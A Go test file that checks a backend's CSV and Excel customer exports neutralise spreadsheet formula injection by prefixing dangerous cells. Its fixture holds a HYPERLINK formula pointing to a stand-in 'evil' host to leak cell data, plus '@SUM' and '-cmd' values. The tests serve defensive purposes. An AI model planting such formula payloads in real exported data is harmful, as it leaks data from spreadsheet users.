package services

import (
	"bytes"
	"context"
	"strings"
	"testing"

	"github.com/google/uuid"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/xuri/excelize/v2"

	"github.com/javaknight1/servicepro/backend/internal/models"
)

func maliciousCustomers() []models.Customer {
	return []models.Customer{{
		ID: uuid.New(), FirstName: `=HYPERLINK("http://evil/?"&A2,"x")`, LastName: "@SUM(1)",
		Email: "e@x.test", PhonePrimary: "+15551234", CustomerType: "residential", Status: "active",
		BillingAddressCity: "-cmd", BillingAddressState: "CA",
	}}
}

func TestExportCSV_NeutralisesFormulas(t *testing.T) {
	s := &unifiedExportService{}
	data, err := s.ExportToCSV(context.Background(), maliciousCustomers(), &models.ExportConfig{Format: models.ExportFormatCSV, ExportType: models.ExportTypeCustomers})
	require.NoError(t, err)
	out := string(data)
	assert.Contains(t, out, `'=HYPERLINK`)
	assert.Contains(t, out, `'@SUM(1)`)
	assert.Contains(t, out, `'+15551234`)
	for _, line := range strings.Split(out, "\n") {
		for _, cell := range strings.Split(line, ",") {
			cell = strings.Trim(cell, `"`)
			if cell != "" && strings.ContainsRune("=+-@", rune(cell[0])) {
				t.Errorf("unsafe cell %q", cell)
			}
		}
	}
}

func TestExportExcel_NeutralisesFormulas(t *testing.T) {
	s := &unifiedExportService{}
	data, err := s.ExportToExcel(context.Background(), maliciousCustomers(), &models.ExportConfig{Format: models.ExportFormatExcel, ExportType: models.ExportTypeCustomers})
	require.NoError(t, err)
	f, err := excelize.OpenReader(bytes.NewReader(data))
	require.NoError(t, err)
	rows, err := f.GetRows(f.GetSheetName(0))
	require.NoError(t, err)
	require.GreaterOrEqual(t, len(rows), 2)
	for _, cell := range rows[1] {
		if cell != "" && strings.ContainsRune("=+-@", rune(cell[0])) {
			t.Errorf("unsafe cell %q", cell)
		}
	}
}
